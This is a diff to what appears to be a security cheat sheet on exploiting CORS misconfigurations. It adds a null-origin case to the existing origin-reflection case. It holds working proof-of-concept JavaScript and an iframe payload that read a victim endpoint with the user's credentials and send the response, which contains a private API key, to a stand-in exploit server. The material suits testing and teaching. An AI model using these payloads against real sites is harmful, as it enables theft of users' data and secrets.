@@ -12,13 +12,15 @@
 
 * BURP HEADER> `Origin: https://evil.com`
 * VICTIM HEADER> `Access-Control-Allow-Credential: true`
-* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com`
+* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` OR `Access-Control-Allow-Origin: null`
 
 ## Exploitation
 
 Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target **https://victim.example.com/endpoint**.
 
-### Vulnerable example 
+### Vulnerable Example: Origin Reflection
+
+#### Vulnerable Implementation
 
 ```powershell
 GET /endpoint HTTP/1.1
@@ -33,7 +35,7 @@ Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
-### Proof of concept
+#### Proof of concept
 
 ```js
 var req = new XMLHttpRequest(); 
@@ -72,6 +74,47 @@ or
          </script>
      </body>
  </html>
+```
+
+### Vulnerable Example: Null Origin
+
+#### Vulnerable Implementation
+
+It's possible that the server does not reflect the complete `Origin` header but
+that the `null` origin is allowed. This would look like this in the server's
+response:
+
+```
+GET /endpoint HTTP/1.1
+Host: victim.example.com
+Origin: null
+Cookie: sessionid=... 
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true 
+
+{"[private API key]"}
+```
+
+#### Proof of concept
+
+This can be exploited by putting the attack code into an iframe using the data
+URI scheme. If the data URI scheme is used, the browser will use the `null`
+origin in the request:
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
+  var req = new XMLHttpRequest ();
+  req.onload = reqListener;
+  req.open('get','https://victim.example.com/endpoint',true);
+  req.withCredentials = true;
+  req.send();
+
+  function reqListener() {
+    location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
+   };
+</script>"></iframe> 
 ```
 
 ## Bug Bounty reports
